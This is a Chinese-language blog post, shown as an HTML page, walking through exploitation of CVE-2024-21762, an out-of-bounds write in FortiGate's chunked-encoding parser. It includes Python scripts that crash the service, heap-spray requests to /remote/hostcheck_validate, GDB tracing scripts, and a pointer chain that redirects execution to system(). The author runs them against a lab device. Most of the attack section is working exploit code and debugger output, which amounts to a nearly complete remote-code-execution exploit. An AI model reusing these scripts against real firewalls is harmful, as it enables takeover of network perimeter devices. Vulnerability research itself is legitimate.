<html>
<head>
    <meta charset="utf-8" />
<meta name="description" content="" />
<meta name="viewport" content="width=device-width, initial-scale=1" />

<title>CVE-2024-21762 FortiGate | 飞光</title>

<link rel="shortcut icon" href="https://blog.augustu.top/favicon.ico?v=1721984284030">

<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://blog.augustu.top/styles/main.css">
<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->

<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>

<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
<!-- DEMO JS -->
<!--<script src="media/scripts/index.js"></script>-->


<script async src="https://www.googletagmanager.com/gtag/js?id=G-9LQ8M10P2E"></script>
<script>
    window.dataLayer = window.dataLayer || [];

    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', 'G-9LQ8M10P2E');
</script>


    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
    
</head>
<body>
<div class="main gt-bg-theme-color-first">
    <nav class="navbar navbar-expand-lg">
    <a class="navbar-brand" href="/">
        <img class="user-avatar" src="/images/avatar.png" alt="头像">
        <div class="site-name gt-c-content-color-first">
            飞光
        </div>
    </a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
    </button>
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <div class="navbar-nav mr-auto" style="text-align: center">
            
            <div class="nav-item">
                
                <a href="/" class="menu gt-a-link">
                    首页
                </a>
                
            </div>
            
            <div class="nav-item">
                
                <a href="/archives" class="menu gt-a-link">
                    归档
                </a>
                
            </div>
            
            <div class="nav-item">
                
                <a href="/tags" class="menu gt-a-link">
                    标签
                </a>
                
            </div>
            
            <div class="nav-item">
                
                <a href="/post/about" class="menu gt-a-link">
                    关于
                </a>
                
            </div>
            
        </div>
        <div style="text-align: center">
            <form id="gridea-search-form" style="position: relative" data-update="1721984284030"
                action="/search/">
                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
            </form>
        </div>
    </div>
</nav>
<script>
    /* 移动端导航栏展开/收起切换 */
    document.getElementById('changeNavbar').onclick = () => {
        var element = document.getElementById('navbarSupportedContent');
        if (element.style.display === 'none' || element.style.display === '') {
            element.style.display = 'block';
        } else {
            element.style.display = 'none';
        }
    }
</script>

    <div class="post-container">
        <div class="post-detail gt-bg-theme-color-second">
            <article class="gt-post-content">
                <h2 class="post-title">
                    CVE-2024-21762 FortiGate
                </h2>
                <div class="post-info">
                    <time class="post-time gt-c-content-color-first">
                        · 2024-06-20 ·
                    </time>
                    
                        <a href="https://blog.augustu.top/tag/eebvwWSSW/" class="post-tags">
                            # 技术
                        </a>
                    
                        <a href="https://blog.augustu.top/tag/nvjcETb7ou/" class="post-tags">
                            # IOT
                        </a>
                    
                </div>
                <div class="post-content">
                    <h3 id="静态分析">静态分析</h3>
<p>这是一个越界写入漏洞，根据前期调研，可以用chunk length字段传入很多个0，0的长度大于剩余缓冲区长度的1/2时，就会触发越界写入</p>
<p>找到漏洞位置</p>
<figure data-type="image" tabindex="1"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240517145406131.png?x-oss-process=style/zip" alt="image-20240517145406131" loading="lazy"></figure>
<p>这里与修复后版本进行对比，发现主要有两个修改点</p>
<figure data-type="image" tabindex="2"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240620110653034.png?x-oss-process=style/zip" alt="image-20240620110653034" loading="lazy"></figure>
<ul>
<li>解析chunk格式时，，检查分块长度是否大于16，大于16认为是非法的chunk length。</li>
</ul>
<figure data-type="image" tabindex="3"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240620110717764.png?x-oss-process=style/zip" alt="image-20240620110717764" loading="lazy"></figure>
<ul>
<li>
<p>读取chunk trailer（数据传输结束标志，大小为0的块）时，写入<code>\r\n</code>的偏移<code>line_off</code>的赋值来源</p>
<p>修复前<code>line_off</code>的值来源于<code>*(_QWORD *)(a1 + 744)</code>，修复后<code>line_off</code>为<code>ap_getline</code>的返回值。</p>
</li>
</ul>
<p>对具体代码进行分析</p>
<pre><code>if ( ap_getline(*(a1 + 760), v26, *(*(a1 + 8) + 40LL), 1LL) &lt;= 0 )
              {
                if ( sub_16DCA50(*(*(a1 + 8) + 40LL)) - 1 &lt;= 4 )
                  return -1LL;
                break;
              }
</code></pre>
<p>这里先用<code>ap_getline</code>检查<code>chunk</code>长度，如果≤0，会继续检查，不通过会返回-1，结束</p>
<p><code>sub_16DCA50</code>简单分析了一下，根据动调一般不会有什么影响，大概是检查偏移 160 字节处的值，并将其转换和处理后返回（整数右移 3 位后，转换为 16 位整数，再转换为无符号 32 位整数）。如果传入的指针无效（即 <code>a1</code> 为零），则返回一个特殊值（<code>4294967292LL</code>）</p>
<p>在检查结束以后，有一段代码</p>
<pre><code>v27 = *(_DWORD *)(a1 + 752);  // 获取当前chunk剩余字节数
line_off = *(_QWORD *)(a1 + 728);  // 当前行的偏移
v29 = v27 - 1;  // 减去1字节，可能用于处理行末的CRLF
if ( line_off != v29 )
{
  v30 = *(_QWORD *)(a1 + 760);  // 缓冲区起始地址
  *(_QWORD *)(a1 + 728) = line_off + 1;
  *(_BYTE *)(v30 + line_off) = 13;  // 写入0x0d (CR)
  v31 = *(_QWORD *)(a1 + 728);  // 更新偏移
  v32 = *(_QWORD *)(a1 + 760);  // 缓冲区起始地址
  *(_QWORD *)(a1 + 728) = v31 + 1;
  *(_BYTE *)(v32 + v31) = 10;  // 写入0x0a (LF)
  v29 = *(_QWORD *)(a1 + 728);  // 更新偏移
  v27 = *(_DWORD *)(a1 + 752);  // 更新chunk剩余字节数
}
</code></pre>
<p>大概逻辑为，在读取chunk trailer时，根据chunk length的字段，如果发现当前chunk已经处理完（即<code>v27</code>等于0），会在缓冲区适当位置写入0x0d（CR）和0x0a（LF），表示chunk的结束。</p>
<figure data-type="image" tabindex="4"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240517143444874.png?x-oss-process=style/zip" alt="image-20240517143444874" loading="lazy"></figure>
<p>总结：</p>
<ul>
<li>
<p>如果chunk length的字段解码后为0的话, 就会从chunk trailer开始读, 而chunk trailer是由ap_getline读取的</p>
</li>
<li>
<p>读取chunk trailer的时候,会根据chunk length的长度写入<code>0x0d,0x0a</code></p>
</li>
<li>
<p>如果在chunk length上传入0的长度大于剩余缓冲区长度的1/2时,就会触发越界写<code>0x0a0d</code></p>
</li>
</ul>
<p>通过栈回溯，查看上级函数，有如下内容</p>
<pre><code>char v4[8200]; // [rsp+0h] [rbp-2020h] BYREF
</code></pre>
<ul>
<li>
<p>因为是64位，可知偏移0x2028的位置保存了返回地址</p>
</li>
<li>
<p>如果在0x202e处写入，那么0x2028处保存的返回地址的最后两个字节将会被替换</p>
</li>
<li>
<p>因为大端寻址，原来应该是xxxxxx0d0a，最后应该成功触发溢出，并显示非法地址是0x0d0axxxxxx</p>
</li>
</ul>
<h3 id="触发crash">触发crash</h3>
<p>用一个简单的脚本触发crash</p>
<pre><code>import socket
import ssl

def creat_ssock(hostname, port):
    context = ssl._create_unverified_context() 
    sock = socket.create_connection((hostname, port))
    ssock = context.wrap_socket(sock, server_hostname=hostname)
    return ssock

hostname = '192.168.150.9' 
port = 10443

pkt = b&quot;&quot;&quot;\
GET /  HTTP/1.1
Host: %s
Transfer-Encoding: chunked

%s\r\n%s\r\n\r\n&quot;&quot;&quot; % (hostname.encode(), b&quot;0&quot; * ((0x202e // 2) - 2), b&quot;a&quot;)

ssock = creat_ssock(hostname, port)
ssock.send(pkt)

response = ssock.recv(4096)
print(response.decode('utf-8'))

ssock.close()
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240517162732131.png?x-oss-process=style/zip" alt="image-20240517162732131" loading="lazy"></figure>
<h3 id="漏洞利用">漏洞利用</h3>
<h4 id="尝试劫持rbp">尝试劫持rbp</h4>
<p>通过覆盖rbp的低字节，使rbp刚好指向可控的内存区域</p>
<ul>
<li><code>rbp</code>为0x2020，写入0x2026个，则<code>rbp</code>地址最后两个字节会被覆盖为<code>\r\n(0d0a)</code></li>
</ul>
<p>但尝试后发现，即使覆盖了栈上的rbp，也无法劫持rsp和rip，甚至程序不会产生崩溃</p>
<figure data-type="image" tabindex="6"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240517165130651.png?x-oss-process=style/zip" alt="image-20240517165130651" loading="lazy"></figure>
<p>向上回溯，找到<code>sub_17F5AC0</code>的父函数<code>sub_180AA90</code>，该函数在返回时并没有调用<code>leave ret</code>来恢复rsp，而是直接<code>add rsp, 0x18</code>，因此无法达到预期的效果。</p>
<figure data-type="image" tabindex="7"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240517164731199.png?x-oss-process=style/zip" alt="image-20240517164731199" loading="lazy"></figure>
<h4 id="堆喷方法">堆喷方法</h4>
<p>但此函数在栈上保存了rbx、r12-r15五个寄存器的值，并在函数返回时恢复这些寄存器，继续回溯，可以看到r13中保存的正是参数<code>a1</code>。</p>
<figure data-type="image" tabindex="8"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240517170331774.png?x-oss-process=style/zip" alt="image-20240517170331774" loading="lazy"></figure>
<p>a1是一个结构体指针，通过调试也可以看出栈上保存的<code>r13</code>是一个堆地址。</p>
<figure data-type="image" tabindex="9"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240517170725549.png?x-oss-process=style/zip" alt="image-20240517170725549" loading="lazy"></figure>
<p>​	如果通过越界写覆盖r13最后两个字节，那么<code>sub_180AA90</code>函数返回时恢复r13寄存器，就可以篡改<code>a1</code>指针的值。如果能够对堆内存进行布局，使得a1指向提前布置好的内存区域，那么就可以劫持整个a1结构体。</p>
<p>​	然后大概看了一下<code>sub_1A27650</code>和<code>sub_1A26040</code>的代码逻辑，感觉a1多级结构体成员的动态函数调用还挺多，这样劫持a1会有更多的利用机会。</p>
<h3 id="劫持结构体">劫持结构体</h3>
<h5 id="结构体大小获取">结构体大小获取</h5>
<p>需要堆喷来调整堆上结构的，所以首先要知道该结构体的大小</p>
<p>一开始断点下错了，分析了一下调用链</p>
<h6 id="调用链分析">调用链分析</h6>
<p>尝试通过栈回溯查看，不能成功在此处下断点</p>
<figure data-type="image" tabindex="10"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240517164731199.png?x-oss-process=style/zip" alt="image-20240517164731199" loading="lazy"></figure>
<p>找到原因，此处预计判断条件错误，不会走到<code>AB39</code>（最后发现是请求脚本写错了）</p>
<figure data-type="image" tabindex="11"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240527200536384.png?x-oss-process=style/zip" alt="image-20240527200536384" loading="lazy"></figure>
<p>调用链：</p>
<ul>
<li>180C1B0
<ul>
<li>180AA90</li>
</ul>
</li>
</ul>
<p>从<code>sub_180AA90</code>返回到<code>sub_180C1B0</code>有如下语句</p>
<pre><code>.text:000000000180C1B0                 mov     edx, 1
.text:000000000180C1B5                 mov     esi, r14d
.text:000000000180C1B8                 mov     rdi, r13
.text:000000000180C1BB                 call    sub_180AA90
.text:000000000180C1C0                 test    eax, eax
</code></pre>
<p>这里重新call了一遍<code>sub_180AA90</code>，并且传入的rdi是从r13来恢复的。该参数对应了一个大结构体。</p>
<p><code>sub_180AA90</code>在返回时从栈上恢复了r13，且通过动调可以发现r13的初始值位于堆上。</p>
<pre><code>.text:000000000180AB39 loc_180AB39:                            ; CODE XREF: sub_180AA90+342↓j
.text:000000000180AB39                                         ; sub_180AA90+36A↓j ...
.text:000000000180AB39                 add     rsp, 18h
.text:000000000180AB3D                 pop     rbx
.text:000000000180AB3E                 pop     r12
.text:000000000180AB40                 pop     r13
.text:000000000180AB42                 pop     r14
.text:000000000180AB44                 pop     r15
.text:000000000180AB46                 pop     rbp
.text:000000000180AB47                 retn
</code></pre>
<pre><code>.text:000000000180C288 loc_180C288:                            ; CODE XREF: sub_180C240+6D↓j
.text:000000000180C288                 mov     rdi, r12
.text:000000000180C28B                 call    sub_181B8E0
.text:000000000180C290                 mov     rdi, r12
.text:000000000180C293                 mov     esi, r13d
.text:000000000180C296                 mov     r12, rbx
.text:000000000180C299                 call    sub_180C0A0
.text:000000000180C29E                 mov     rax, [rbx+18h]
.text:000000000180C2A2                 lea     rbx, [rax-18h]
.text:000000000180C2A6                 cmp     r12, offset qword_BF042C0
.text:000000000180C2AD                 jnz     short loc_180C288
</code></pre>
<h6 id="查看结构体分配位置">查看结构体分配位置</h6>
<p>经过观察，可被劫持的<code>r13</code>保存的结构体在不同请求中的分配几乎都在同一个位置，因此可以直接下watch断点来找到它被分配的代码位置。</p>
<img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240529152353608.png?x-oss-process=style/zip" alt="image-20240529152353608" style="zoom: 33%;" />
<img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240529152604553.png?x-oss-process=style/zip" alt="image-20240529152604553" style="zoom: 33%;" />
<pre><code>pwndbg&gt; watch *0x7ff2b8c54800
Hardware watchpoint 4: *0x7ff2b8c54800
</code></pre>
<img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240529153022964.png?x-oss-process=style/zip" alt="image-20240529153022964" style="zoom:67%;" />
<p>断下来之后查看调用栈，发现是<code>je_calloc</code>开的空间</p>
<figure data-type="image" tabindex="12"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240529153352802.png?x-oss-process=style/zip" alt="image-20240529153352802" loading="lazy"></figure>
<p>找到<code>je_calloc@plt</code>调用位置后，下断点查看</p>
<figure data-type="image" tabindex="13"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240529154643089.png?x-oss-process=style/zip" alt="image-20240529154643089" loading="lazy"></figure>
<p><code>je_calloc</code>原型如下</p>
<pre><code>void *je_calloc(size_t nmemb, size_t size);
</code></pre>
<p>所以结构体大小是0x730</p>
<h5 id="尝试布置堆块">尝试布置堆块</h5>
<p>这里使用了一个GDB脚本在分配大小接近0x730时自动打印对je_malloc和je_calloc的调用</p>
<pre><code>b je_malloc if (($rdi &gt;= 0x700) &amp;&amp; ($rdi &lt;= 0x800))
commands
    silent
    set $malloc_size = $rdi
    c
end

b *(je_malloc+205)
commands
    silent
    if (($malloc_size &gt;= 0x700) &amp;&amp; ($malloc_size &lt;= 0x800))
        printf &quot;je_malloc: %p : %p : %d\n&quot;, $rax, ($rax + $malloc_size), $malloc_size
        set $malloc_size = 0
    end
    c
end

b je_calloc if (($rsi &gt;= 0x700) &amp;&amp; ($rsi &lt;= 0x800))
commands
    silent
    set $calloc_size = $rsi
    c
end

b *(je_calloc+340)
commands
    silent
    if (($calloc_size &gt;= 0x700) &amp;&amp; ($calloc_size &lt;= 0x800))
        printf &quot;je_calloc: %p : %p : %d\n&quot;, $rax, ($rax + $calloc_size), $calloc_size
        set $calloc_size = 0
    end
    c
end

set $malloc_size = 0
set $calloc_size = 0
</code></pre>
<p>只看到一个分配</p>
<pre><code>je_calloc: 0x7f1ecfc54800 : 0x7f1ecfc54f30 : 1840
</code></pre>
<p>从以前的攻击中知道，FortiGate在解析每个表单post参数时会创建单独的分配，所以感觉可以对具体分配控制的细一点，发了一个带五个参数的请求，每个参数长度都为目标分配大小。</p>
<p>具体脚本</p>
<pre><code class="language-Python">import socket
import ssl

def create_ssock(hostname, port):
    context = ssl._create_unverified_context()
    sock = socket.create_connection((hostname, port))
    ssock = context.wrap_socket(sock, server_hostname=hostname)
    return ssock

hostname = '192.168.150.9'
port = 10443

# 修改body内容
body = (b&quot;A&quot; * 1840 + b&quot;=&amp;&quot;) * 5

# 构造POST请求的数据
data = b&quot;POST /remote/hostcheck_validate HTTP/1.1\r\n&quot;
data += b&quot;Host: 192.168.1.229\r\n&quot;
data += b&quot;Content-Length: &quot; + str(len(body)).encode(&quot;utf-8&quot;) + b&quot;\r\n&quot;
data += b&quot;\r\n&quot;
data += body

# 创建SSL套接字并发送数据
ssock = create_ssock(hostname, port)
ssock.send(data)

# 接收响应
response = ssock.recv(4096)
print(response.decode('utf-8'))

# 关闭套接字
ssock.close()
</code></pre>
<p>结果如下</p>
<pre><code>je_calloc: 0x7f1ecfc54800 : 0x7f1ecfc54f30 : 1840
je_malloc: 0x7f1eceff5800 : 0x7f1eceff5f50 : 1872
je_malloc: 0x7f1ecf016000 : 0x7f1ecf016750 : 1872
je_malloc: 0x7f1ecf015800 : 0x7f1ecf015f50 : 1872
je_malloc: 0x7f1ecf01e800 : 0x7f1ecf01ef50 : 1872
je_malloc: 0x7f1ecefdf800 : 0x7f1ecefdff50 : 1872
je_malloc: 0x7f1ecf01f800 : 0x7f1ecf01ff50 : 1872
je_malloc: 0x7f1ecf01d400 : 0x7f1ecf01db50 : 1872
je_malloc: 0x7f1ecf020800 : 0x7f1ecf020f50 : 1872
je_malloc: 0x7f1ecf01d800 : 0x7f1ecf01df50 : 1872
</code></pre>
<p>malloc跟calloc大小不太一样，增加了32个字节（最后一列为10进制），但根据之前的分析，应该都能够分配大小相同（0x800）并且连续的堆块</p>
<p>通过以上测试，调整一下大小，最终形成如下两个请求</p>
<pre><code class="language-Python">import socket
import ssl
import time

def create_ssock(hostname, port):
    context = ssl._create_unverified_context()
    sock = socket.create_connection((hostname, port))
    ssock = context.wrap_socket(sock, server_hostname=hostname)
    return ssock

TARGET = '192.168.150.9'
PORT = 10443
ssock1 = create_ssock(TARGET, PORT)
# 布置堆块
body = (b&quot;A&quot;*1901 + b&quot;=&quot; + b&quot;B&quot;*1901 + b&quot;&amp;&quot;)*15

data = b&quot;POST /remote/hostcheck_validate HTTP/1.1\r\n&quot;
data += b&quot;Host: 192.168.150.9\r\n&quot;
data += b&quot;Content-Length: &quot; + str(len(body)).encode(&quot;utf-8&quot;) + b&quot;\r\n&quot;
data += b&quot;\r\n&quot;
data += body

ssock1.sendall(data)

time.sleep(1)
ssock2 = create_ssock(TARGET, PORT)

data  = b&quot;POST / HTTP/1.1\r\n&quot;
data += b&quot;Host: 192.168.1.229\r\n&quot;
data += b&quot;Transfer-Encoding: chunked\r\n&quot;
data += b&quot;\r\n&quot;
data += b&quot;0&quot;*4120 + b&quot;\0&quot;
data += b&quot;A&quot;*1 + b&quot;\r\n\r\n&quot;
ssock2.sendall(data)
</code></pre>
<p>第一个请求是为了布置堆</p>
<p>第二个请求使用一开始计算的4120，在0x0a0d覆盖后下断点查看情况</p>
<p>根据之前的梳理，<code>sub_16E6130</code>就是漏洞所在处，此处<code>0x0a0d</code>完成覆盖，选择在<code>0x17f5af6</code>处后下断点</p>
<figure data-type="image" tabindex="14"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240530170835871.png?x-oss-process=style/zip" alt="image-20240530170835871" loading="lazy"></figure>
<h6 id="写入地址错误">写入地址错误</h6>
<p>发现因为大端的问题，0x0a0d写入地址错误</p>
<figure data-type="image" tabindex="15"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240531131055713.png?x-oss-process=style/zip" alt="image-20240531131055713" loading="lazy"></figure>
<h6 id="堆喷失败">堆喷失败</h6>
<p>尝试进行调整，但调整成功以后发现没能成功喷到</p>
<figure data-type="image" tabindex="16"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240531142725059.png?x-oss-process=style/zip" alt="image-20240531142725059" loading="lazy"></figure>
<p>这里和同门讨论了一下，他用的另一种方法，溢出点不同，填充字符数量为4137，我尝试了一下确实成功了</p>
<h6 id="探究原因">探究原因</h6>
<p>尝试探究了一下具体原因，根据我们一开始堆喷的思路，a1指针的低字节被覆盖成<code>\r\n</code>后，可以恰好指向预先布置好的内存。这里我简单画了个图：</p>
<figure data-type="image" tabindex="17"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240531144339860.png?x-oss-process=style/zip" alt="image-20240531144339860" loading="lazy"></figure>
<p>为实现这一效果，需要达成如下条件：</p>
<ol>
<li>a1结构体地址比堆喷区域地址更高，并且二者间隔很小。</li>
<li><code>0x7fxxxxxxx0a0d</code>一定指向伪造的结构体。</li>
</ol>
<p>我重新看了一下<code>r13</code>的地址和<code>rbp</code>寄存器，根据之前的调试经验，寄存器中地址在此处相对固定，跟<code>r13</code>相近的地址大概有如下几处</p>
<figure data-type="image" tabindex="18"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240531140149721.png?x-oss-process=style/zip" alt="image-20240531140149721" loading="lazy"></figure>
<p>也就是说，可用的偏移只有4137、4133、4121，这里我使用4121重新尝试了一下</p>
<p>一开始堆喷没有成功喷到，堆喷成功率确实不是非常稳定</p>
<figure data-type="image" tabindex="19"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240531132325247.png?x-oss-process=style/zip" alt="image-20240531132325247" loading="lazy"></figure>
<p>继续尝试，成功劫持结构体</p>
<figure data-type="image" tabindex="20"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240531140721537.png?x-oss-process=style/zip" alt="image-20240531140721537" loading="lazy"></figure>
<p>又用4137尝试了一下，也能成功劫持</p>
<figure data-type="image" tabindex="21"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240530162220602.png?x-oss-process=style/zip" alt="image-20240530162220602" loading="lazy"></figure>
<p>这样就可以可靠地将r13指针重定向到能够控制的缓冲区。然后填充缓冲区，实现远程代码执行。</p>
<p>最终劫持请求如下</p>
<pre><code>import socket
import ssl
import time

def create_ssock(hostname, port):
    context = ssl._create_unverified_context()
    sock = socket.create_connection((hostname, port))
    ssock = context.wrap_socket(sock, server_hostname=hostname)
    return ssock

TARGET = '192.168.150.9'
PORT = 10443
ssock1 = create_ssock(TARGET, PORT)

body = (b&quot;A&quot;*1901 + b&quot;=&quot; + b&quot;B&quot;*1901 + b&quot;&amp;&quot;)*15


data = b&quot;POST /remote/hostcheck_validate HTTP/1.1\r\n&quot;
data += b&quot;Host: 192.168.150.9\r\n&quot;
data += b&quot;Content-Length: &quot; + str(len(body)).encode(&quot;utf-8&quot;) + b&quot;\r\n&quot;
data += b&quot;\r\n&quot;
data += body

ssock1.sendall(data)

time.sleep(1)
ssock2 = create_ssock(TARGET, PORT)

data  = b&quot;POST / HTTP/1.1\r\n&quot;
data += b&quot;Host: 192.168.1.229\r\n&quot;
data += b&quot;Transfer-Encoding: chunked\r\n&quot;
data += b&quot;\r\n&quot;
data += b&quot;0&quot;*4121 + b&quot;\0&quot;
#data += b&quot;0&quot;*4140 + b&quot;\0&quot;
data += b&quot;A&quot;*1 + b&quot;\r\n\r\n&quot;
ssock2.sendall(data)
</code></pre>
<pre><code>.plt:000000000043FDF0                 jmp     cs:off_42616F8
.plt:000000000043FDF0 _system         endp
</code></pre>
<pre><code>000000000180AAAE                 mov     r13, [rdi+298h]

000000000180AAC3                 mov     r15, [r13+70h]

000000000180AAFD                 mov     rax, [rax+r15+20h]

000000000180AB0B                 call    rax
</code></pre>
<pre><code>.plt:000000000043FDF0                 jmp     cs:off_42616F8
.plt:000000000043FDF0 _system         endp

.got.plt:00000000042616F8 off_42616F8     dq offset system        ; DATA XREF: _system↑r
</code></pre>
<p>这是最后一次解引用，所以我们有以下内容，分为两个步骤。</p>
<pre><code>tmp0 = rax + r15 + 0x20 (0x042616F8)
rax  = *tmp0            (0x0043FDF0)
call rax
</code></pre>
<p>我们使用调试器逐步检查了代码，发现rax在这一点上通常是0x20，因此我们可以将其简化为以下内容。</p>
<pre><code>tmp0 = r15 + 0x40 (0x042616F8)
rax  = *tmp0      (0x0043FDF0)
call rax
</code></pre>
<pre><code>tmp1 = r13 + 0x70 (0x00432F70)
r15  = *tmp1      (0x042616B8)
tmp0 = r15 + 0x40 (0x042616F8)
rax  = *tmp0      (0x0043FDF0)
call rax
</code></pre>
<p>0x042616F8-0x40=0x042616B8</p>
<figure data-type="image" tabindex="22"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240607141340616.png?x-oss-process=style/zip" alt="image-20240607141340616" loading="lazy"></figure>
<p>最后一步意味着我们只需要在rdi + 0x298处写入0x00432F00。因为我们控制了rdi指向的地方，所以应该没有问题。</p>
<pre><code>tmp2 = rdi + 0x298
r13  = *tmp2      (0x00432F00)
tmp1 = r13 + 0x70 (0x00432F70)
r15  = *tmp1      (0x042616B8)
tmp0 = r15 + 0x40 (0x042616F8)
rax  = *tmp0      (0x0043FDF0)
call rax
</code></pre>
<pre><code>system_ptr = b&quot;%00%2f%43%00%00%00%00%00&quot; # 0x00432F00
body = (b&quot;B&quot;*1165 + system_ptr + b&quot;B&quot;*713 + b&quot;=&amp;&quot;)*25

data  = b&quot;POST /remote/hostcheck_validate HTTP/1.1\r\n&quot;
data += b&quot;Host: 192.168.150.9\r\n&quot;
data += f&quot;Content-Length: {len(body)}\r\n&quot;.encode(&quot;utf-8&quot;)
data += b&quot;\r\n&quot;
data += body
</code></pre>
<p>一开始没能成功堆喷</p>
<figure data-type="image" tabindex="23"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240607142926726.png?x-oss-process=style/zip" alt="image-20240607142926726" loading="lazy"></figure>
<figure data-type="image" tabindex="24"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240607145049053.png?x-oss-process=style/zip" alt="image-20240607145049053" loading="lazy"></figure>
<figure data-type="image" tabindex="25"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240607150557994.png?x-oss-process=style/zip" alt="image-20240607150557994" loading="lazy"></figure>
<figure data-type="image" tabindex="26"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240607150656418.png?x-oss-process=style/zip" alt="image-20240607150656418" loading="lazy"></figure>
<figure data-type="image" tabindex="27"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240607150831110.png?x-oss-process=style/zip" alt="image-20240607150831110" loading="lazy"></figure>
<figure data-type="image" tabindex="28"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240607150936603.png?x-oss-process=style/zip" alt="image-20240607150936603" loading="lazy"></figure>
<p>成功走到call system，后面的步骤感觉就是和前两个漏洞一样，找gadget构造ROP，基本一致</p>

                </div>
            </article>
        </div>

        
            <div class="next-post">
                <div class="next gt-c-content-color-first">下一篇</div>
                <a href="https://blog.augustu.top/post/tea/" class="post-title gt-a-link">
                    茶叶尝试
                </a>
            </div>
        

        

        

        

        <div class="site-footer gt-c-content-color-first">
    <div class="slogan gt-c-content-color-first">吾不识青天高，黄地厚<br> 
唯见月寒日暖，来煎人寿</div>
    <div class="social-container">
        
            
        
            
        
            
        
            
        
            
        
            
        
    </div>
    <div class="footer-info">
        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
    </div>
    <div>
        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://blog.augustu.top/atom.xml" target="_blank">RSS</a>
    </div>
</div>

<script>
  hljs.highlightAll()
</script>

    </div>
</div>
</body>
</html>
